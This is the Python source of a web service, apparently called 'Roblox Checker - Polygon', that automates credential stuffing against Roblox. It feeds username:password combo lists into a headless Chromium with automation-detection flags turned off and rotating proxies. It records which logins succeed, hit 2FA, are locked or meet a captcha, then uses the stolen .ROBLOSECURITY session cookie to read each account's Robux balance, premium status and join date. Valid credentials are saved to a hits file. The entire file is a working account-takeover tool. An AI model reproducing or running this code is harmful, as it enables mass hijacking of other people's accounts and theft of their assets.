import asyncio
import aiohttp
import json
import os
import tempfile
import shutil
import requests
from pathlib import Path
from flask import Flask, request, jsonify
from rich.console import Console
from playwright.async_api import async_playwright
from colorama import Fore, init
from threading import Lock
import sys
import waitress

console = Console()

CURRENT_VERSION = "1.0.0"
GITHUB_VERSION_URL = "https://raw.githubusercontent.com/xGCrafter/Roblox-Checker---Polygon/main/version.txt"

def check_version():
    try:
        response = requests.get(GITHUB_VERSION_URL, timeout=5)
        response.raise_for_status()
        latest_version = response.text.strip()
        if latest_version != CURRENT_VERSION:
            print(f"Update required: Version {latest_version} available.")
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"Version check failed: {str(e)}")
        sys.exit(1)

check_version()

app = Flask(__name__)
init(autoreset=True)
progress_lock = Lock()

CONFIG = {
    "timeout": 30,
    "retry_delay": 1.0,
    "api_delay": 0.5,
    "proxies": []
}

stats = {
    "hits": 0, "twofa": 0, "bad": 0, "totalrbx": 0,
    "locked": 0, "captcha": 0, "checked": 0, "total": 0
}

TEMP_DIR = Path(tempfile.gettempdir()) / "Polygon"
TEMP_DIR.mkdir(parents=True, exist_ok=True)
PROGRESS_FILE = TEMP_DIR / "progress.json"

def verify_license(license_key: str) -> dict:
    """Simple license verification - replace with actual validation logic"""
    try:
        if not license_key.strip():
            return {"valid": False, "message": "Enter a license key."}
        
        # For demo purposes, accept any non-empty key
        # Replace with actual validation logic
        return {"valid": True, "message": "License valid"}
    except Exception as e:
        return {"valid": False, "message": f"Validation error: {str(e)}"}

def get_script_dir() -> Path:
    return Path(__file__).parent

def get_temp_dir() -> Path:
    return Path(tempfile.gettempdir()) / "Polygon"

def get_random_proxy(proxies: list, proxy_index: int) -> str | None:
    if not proxies or proxy_index >= len(proxies):
        return None
    return proxies[proxy_index % len(proxies)]

def save_result(output_dir: str, category: str, account: str, account_details: dict = None):
    try:
        output_path = Path(output_dir)
        output_path.mkdir(parents=True, exist_ok=True)
        file_map = {
            "Valid": "hits.txt",
            "Invalid": "bad.txt",
            "2FA": "2fa.txt",
            "Locked": "locked.txt",
            "Captcha": "captcha.txt",
            "Bad": "bad.txt"
        }
        file_name = file_map.get(category, "bad.txt")
        file_path = output_path / file_name
        with file_path.open("a", encoding="utf-8") as f:
            if category == "Valid" and account_details:
                details_str = (
                    f"Account: {account}\n"
                    f"Robux: {account_details.get('robux', 'N/A')}\n"
                    f"Premium Status: {account_details.get('is_premium', 'N/A')}\n"
                    f"Join Date: {account_details.get('join_date', 'N/A')}\n"
                    f"{'-'*50}\n"
                )
                f.write(details_str)
            else:
                f.write(f"[{account}]\n")
    except Exception as e:
        print(f"Result save failed: {str(e)}")

async def check_for_captcha(page):
    """Enhanced captcha detection"""
    try:
        # Common captcha selectors
        captcha_selectors = [
            'iframe[src*="captcha"]',
            'iframe[src*="recaptcha"]',
            'iframe[src*="hcaptcha"]',
            '.g-recaptcha',
            '.h-captcha',
            '.rc-anchor',
            '.captcha-container',
            '#captcha',
            '[data-captcha]',
            '.cf-turnstile',
            'div[id*="captcha"]',
            'div[class*="captcha"]',
            '.funcaptcha',
            '#funcaptcha',
            '[data-cy="captcha"]',
            '.arkose-enforcement-challenge'
        ]
        
        # Check for captcha elements
        for selector in captcha_selectors:
            if await page.locator(selector).count() > 0:
                print(f"Captcha detected with selector: {selector}")
                return True
        
        # Check page content for captcha keywords
        try:
            page_content = await page.content()
            captcha_keywords = [
                'captcha', 'recaptcha', 'hcaptcha', 'verification', 
                'prove you are human', 'robot', 'challenge',
                'funcaptcha', 'arkose', 'cloudflare'
            ]
            
            content_lower = page_content.lower()
            for keyword in captcha_keywords:
                if keyword in content_lower:
                    print(f"Captcha detected with keyword: {keyword}")
                    return True
        except Exception as e:
            print(f"Content check error: {e}")
        
        # Check URL for captcha indicators
        current_url = page.url.lower()
        url_indicators = ['captcha', 'challenge', 'verification', 'security-check']
        for indicator in url_indicators:
            if indicator in current_url:
                print(f"Captcha detected in URL: {indicator}")
                return True
                
        return False
    except Exception as e:
        print(f"Captcha check error: {e}")
        return False

async def fetch_account_details_api(session, user_id, roblox_security, console: Console, proxies: list) -> dict:
    details = {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
    headers = {
        "Cookie": f".ROBLOSECURITY={roblox_security}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36"
    }
    proxy_index = 0
    
    # Get robux
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            connector = aiohttp.TCPConnector()
            timeout = aiohttp.ClientTimeout(total=30)
            
            proxy_url = f"http://{proxy}" if proxy else None
            async with session.get(
                f"https://economy.roblox.com/v1/users/{user_id}/currency",
                headers=headers,
                proxy=proxy_url,
                timeout=timeout
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    details["robux"] = data.get("robux", 0)
                    stats["totalrbx"] += details["robux"]
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                elif response.status in (401, 403):
                    return None
                else:
                    proxy_index += 1
                    break
        except Exception as e:
            print(f"Robux API error: {e}")
            proxy_index += 1
            break
    
    # Get premium status
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            proxy_url = f"http://{proxy}" if proxy else None
            async with session.get(
                f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership",
                headers=headers,
                proxy=proxy_url,
                timeout=timeout
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    details["is_premium"] = "Yes" if data.get("isPremium", False) else "No"
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                elif response.status in (401, 403):
                    return None
                else:
                    proxy_index += 1
                    break
        except Exception as e:
            print(f"Premium API error: {e}")
            proxy_index += 1
            break
    
    # Get join date
    for attempt in range(2):
        proxy = get_random_proxy(proxies, proxy_index)
        try:
            await asyncio.sleep(CONFIG["api_delay"])
            proxy_url = f"http://{proxy}" if proxy else None
            async with session.get(
                f"https://users.roblox.com/v1/users/{user_id}",
                headers=headers,
                proxy=proxy_url,
                timeout=timeout
            ) as response:
                if response.status == 200:
                    data = await response.json()
                    details["join_date"] = data.get("created", "N/A")
                    break
                elif response.status == 429:
                    proxy_index += 1
                    await asyncio.sleep(CONFIG["retry_delay"])
                elif response.status in (401, 403):
                    return None
                else:
                    proxy_index += 1
                    break
        except Exception as e:
            print(f"Join date API error: {e}")
            proxy_index += 1
            break
    
    return details

async def fetch_account_details_scrape(page, user_id, console: Console) -> dict:
    details = {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
    try:
        # Get robux from home page
        try:
            await page.goto("https://www.roblox.com/home", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
            robux_selectors = [
                "span#navbar-robux-balance",
                ".navbar-robux-balance",
                "[data-testid='navigation-robux-balance']",
                ".rbx-text-navbar-right"
            ]
            
            for selector in robux_selectors:
                try:
                    robux_text = await page.locator(selector).text_content(timeout=3000)
                    if robux_text:
                        robux = int(''.join(filter(str.isdigit, robux_text)))
                        details["robux"] = robux
                        stats["totalrbx"] += robux
                        break
                except:
                    continue
        except Exception as e:
            print(f"Robux scrape failed: {str(e)}")
        
        # Get profile details
        try:
            await page.goto(f"https://www.roblox.com/users/{user_id}/profile", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
            
            # Check for premium badge
            premium_selectors = [
                "span.icon-premium",
                ".premium-badge",
                "[data-testid='premium-badge']",
                ".profile-premium-icon"
            ]
            
            for selector in premium_selectors:
                try:
                    premium_count = await page.locator(selector).count()
                    if premium_count > 0:
                        details["is_premium"] = "Yes"
                        break
                except:
                    continue
            
            if details["is_premium"] == "N/A":
                details["is_premium"] = "No"
            
            # Get join date
            join_selectors = [
                "span.profile-join-date",
                "div.profile-header-content span",
                "p.profile-about-content-text",
                "div.profile-statistics span",
                "[data-testid='join-date']"
            ]
            
            for selector in join_selectors:
                try:
                    join_text = await page.locator(selector).text_content(timeout=3000)
                    if join_text and ("joined" in join_text.lower() or any(month in join_text.lower() for month in ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"])):
                        details["join_date"] = join_text.strip()
                        break
                except:
                    continue
                    
        except Exception as e:
            print(f"Profile scrape failed: {str(e)}")
            
    except Exception as e:
        print(f"Scrape error: {str(e)}")
    
    return details

async def fetch_account_details(page, cookies, console: Console, proxies: list) -> dict:
    try:
        roblox_security = next((c["value"] for c in cookies if c["name"] == ".ROBLOSECURITY"), None)
        if not roblox_security:
            return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
        
        # Get user ID
        user_id = None
        try:
            user_id_script = await page.evaluate(r'() => document.body.innerHTML.match(/data-userid="(\d+)"/)?.[1]')
            user_id = user_id_script if user_id_script else None
        except Exception as e:
            print(f"User ID extract failed: {str(e)}")
        
        if not user_id:
            return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}
        
        # Try API first, then fallback to scraping
        if roblox_security and proxies:
            try:
                async with aiohttp.ClientSession() as session:
                    api_details = await fetch_account_details_api(session, user_id, roblox_security, console, proxies)
                    if api_details is not None:
                        return api_details
            except Exception as e:
                print(f"API details failed, falling back to scraping: {e}")
        
        return await fetch_account_details_scrape(page, user_id, console)
    except Exception as e:
        print(f"Details fetch failed: {str(e)}")
        return {"robux": "N/A", "is_premium": "N/A", "join_date": "N/A"}

async def login_account(page, username, password, proxies, console):
    """Login to a single account and return result"""
    try:
        print(f"Checking {username}...")
        
        # Navigate to login page
        await page.goto("https://www.roblox.com/login", wait_until="domcontentloaded", timeout=CONFIG["timeout"] * 1000)
        
        # Fill login form
        await page.fill("input#login-username", username)
        await page.fill("input#login-password", password)
        await page.click("button#login-button")
        
        # Wait for response
        await page.wait_for_load_state("networkidle", timeout=CONFIG["timeout"] * 1000)
        
        # Check for captcha first
        if await check_for_captcha(page):
            print(f"Captcha detected for {username}")
            return {"status": "captcha", "details": None}
        
        # Check login result
        current_url = page.url.lower()
        
        if "home" in current_url or "dashboard" in current_url:
            # Successful login - get account details
            cookies = await page.context.cookies()
            details = await fetch_account_details(page, cookies, console, proxies)
            print(f"Valid account: {username}")
            return {"status": "valid", "details": details}
        elif "challenge" in current_url or await page.locator("div#challenge").count() > 0:
            print(f"2FA required for {username}")
            return {"status": "2fa", "details": None}
        elif "locked" in current_url or await page.locator("div#locked").count() > 0:
            print(f"Account locked: {username}")
            return {"status": "locked", "details": None}
        else:
            # Check for error messages
            error_selectors = [
                ".alert-warning",
                ".alert-danger", 
                ".text-error",
                "#login-form .form-control-label",
                ".form-has-error"
            ]
            
            has_error = False
            for selector in error_selectors:
                if await page.locator(selector).count() > 0:
                    has_error = True
                    break
            
            if has_error:
                print(f"Login failed for {username}")
                return {"status": "bad", "details": None}
            
            # Default to bad if we can't determine status
            print(f"Unknown status for {username}, marking as bad")
            return {"status": "bad", "details": None}
            
    except Exception as e:
        print(f"Login error for {username}: {e}")
        return {"status": "bad", "details": None}

async def login_worker(queue, context, semaphore, output_dir, proxies, console, results):
    """Worker function to process login queue"""
    async with semaphore:
        while True:
            try:
                combo = await asyncio.wait_for(queue.get(), timeout=1.0)
                if not combo:
                    break
                    
                username, password = combo.split(":", 1)
                page = await context.new_page()
                
                try:
                    result = await login_account(page, username, password, proxies, console)
                    
                    # Update stats based on result
                    status = result["status"]
                    if status == "valid":
                        stats["hits"] += 1
                        if result["details"] and result["details"]["robux"] != "N/A":
                            try:
                                stats["totalrbx"] += int(result["details"]["robux"])
                            except:
                                pass
                    elif status == "2fa":
                        stats["twofa"] += 1
                    elif status == "locked":
                        stats["locked"] += 1
                    elif status == "captcha":
                        stats["captcha"] += 1
                    else:
                        stats["bad"] += 1
                    
                    stats["checked"] += 1
                    
                    # Save result
                    status_map = {
                        "valid": "Valid",
                        "2fa": "2FA", 
                        "locked": "Locked",
                        "captcha": "Captcha",
                        "bad": "Bad"
                    }
                    save_result(output_dir, status_map[status], f"{username}:{password}", result["details"])
                    
                    # Add to results
                    results.append({
                        "account": f"{username}:{password}",
                        "status": status_map[status],
                        "details": result["details"]
                    })
                    
                    # Update progress file
                    with progress_lock:
                        with open(PROGRESS_FILE, "w") as f:
                            json.dump(stats, f)
                    
                except Exception as e:
                    print(f"Error processing {combo}: {e}")
                    stats["bad"] += 1
                    stats["checked"] += 1
                    save_result(output_dir, "Bad", f"{username}:{password}")
                    results.append({
                        "account": f"{username}:{password}",
                        "status": "Bad",
                        "details": None
                    })
                finally:
                    await page.close()
                    queue.task_done()
                    
            except asyncio.TimeoutError:
                break
            except Exception as e:
                print(f"Worker error: {e}")
                break

@app.route("/web/validate", methods=["GET"])
def validate():
    license_key = request.args.get("key", "")
    return jsonify(verify_license(license_key))

@app.route("/web/check_accounts", methods=["POST"])
def check_accounts():
    """Main endpoint to check accounts"""
    try:
        global stats
        data = request.get_json()
        combos = data.get("combos", [])
        proxies = data.get("proxies", [])
        use_proxies = data.get("use_proxies", False)
        use_captcha_solver = data.get("use_captcha_solver", False)
        nopecha_api_key = data.get("nopecha_api_key", "")
        max_tasks = data.get("max_tasks", 1)
        headless = data.get("headless", True)

        # Initialize stats
        stats = {
            "hits": 0, "twofa": 0, "bad": 0, "totalrbx": 0,
            "locked": 0, "captcha": 0, "checked": 0, "total": len(combos)
        }
        
        with open(PROGRESS_FILE, "w") as f:
            json.dump(stats, f)

        # Setup output directory
        output_dir = os.path.join(get_temp_dir(), "output")
        if os.path.exists(output_dir):
            shutil.rmtree(output_dir, ignore_errors=True)

        # Run the async checker
        results = asyncio.run(run_checker_async(combos, proxies, use_proxies, headless, max_tasks, output_dir))
        
        return jsonify({
            "stats": stats, 
            "results": results, 
            "output_dir": output_dir
        })
        
    except Exception as e:
        print(f"Server error: {e}")
        return jsonify({"error": f"Server error: {str(e)}"}), 500

async def run_checker_async(combos, proxies, use_proxies, headless, max_tasks, output_dir):
    """Async function to run the checker"""
    results = []
    queue = asyncio.Queue()
    
    # Add combos to queue
    for combo in combos:
        await queue.put(combo)

    async with async_playwright() as p:
        # Browser setup
        browser_args = [
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-infobars",
            "--disable-dev-shm-usage"
        ]
        
        if not headless:
            browser_args.extend([
                "--start-maximized",
                "--disable-gpu"
            ])

        browser_kwargs = {
            "headless": headless,
            "args": browser_args,
        }

        browser = await p.chromium.launch(**browser_kwargs)
        
        # Context setup
        proxy = get_random_proxy(proxies, 0) if use_proxies else None
        context_options = {
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
            "viewport": {"width": 1280, "height": 720}
        }
        
        if proxy:
            context_options["proxy"] = {"server": f"http://{proxy}"}

        context = await browser.new_context(**context_options)

        # Create semaphore and workers
        semaphore = asyncio.Semaphore(max_tasks)
        tasks = []
        
        for _ in range(max_tasks):
            task = asyncio.create_task(
                login_worker(queue, context, semaphore, output_dir, proxies, console, results)
            )
            tasks.append(task)

        # Wait for all tasks to complete
        await queue.join()
        
        # Cancel remaining tasks
        for task in tasks:
            task.cancel()

        await context.close()
        await browser.close()

    return results

@app.route("/web/get_progress", methods=["GET"])
def get_progress():
    """Get current progress"""
    try:
        if PROGRESS_FILE.exists():
            with open(PROGRESS_FILE, "r") as f:
                progress_stats = json.load(f)
            return jsonify(progress_stats)
        else:
            return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    host = os.getenv("HOST", "0.0.0.0")
    port = int(os.getenv("PORT", 5500))
    print(f"Starting production server on {host}:{port}")
    waitress.serve(app, host=host, port=port)
